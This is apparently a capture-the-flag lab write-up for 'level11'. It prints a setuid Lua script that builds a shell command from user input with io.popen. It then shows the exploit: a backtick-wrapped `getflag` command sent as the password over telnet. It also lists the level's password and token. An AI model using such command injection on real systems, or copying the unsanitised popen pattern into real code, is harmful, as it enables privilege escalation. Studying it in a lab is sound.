# Level11 - Flag11

## Local script usage

```shell
Usage: ./Ressources/main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level11 | `feulo4b72j7edeahuete3no7c` |
| flag11  |                             |
| token   | `fa6v5ateaw21peobuub8ipe6s` |

## Steps to resolve on VM

1. Connect to `level11` user and notice there is a lua script with setuid bit

```bash
ssh level11@$SNOW_HOST -p 4242
# Enter the password

ls -l

> -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

2. Check the file

```bash
cat level11.lua
```

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151)) -- localhost:5151

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r") -- Note echo and "pass" parameter
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

While reading the script, we can see what the program do.

It asks for a password, then hashes it, then compares the hashed password with an other hashed string, and finally... nothing, just return a useless message.

It would be a waste a time to try to decrypt the hashed string.

The interesting thing here is `echo` runned by a program with setuid permission. We can exploit this echo and inject a command.

3. Run the script (or check it is already running)

Check running process

```bash
ps aux | grep level11.lua

> USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
> flag11    2041  0.0  0.0   2892   828 ?        S    15:02   0:00 lua /home/user/level11/level11.lua
```

Check listening ports

```bash
netstat -tulpn | grep 5151

> Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
> tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
```

If the program is already running and the port 5151 open, we can ignore this step.

Otherwise run:

```bash
./level11.lua
```

4. Exploit echo with injection

Exploit echo command inside script while injecting getflag command

```bash
telnet localhost 5151

> Trying 127.0.0.1...
> Connected to localhost.
> Escape character is '^]'.
> Password :
```

Then injection command instead of password :

```bash
`getflag > /tmp/getflag`

# ignore next messages
> Erf nope..
> Connection closed by foreign host.
```

7. Get level flag

Finally, read `/tmp/getflag`

```bash
cat /tmp/getflag

> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

---

## Sources

### Shell

- [Check ports in use](https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/)
- [Man telnet](https://linux.die.net/man/1/telnet)
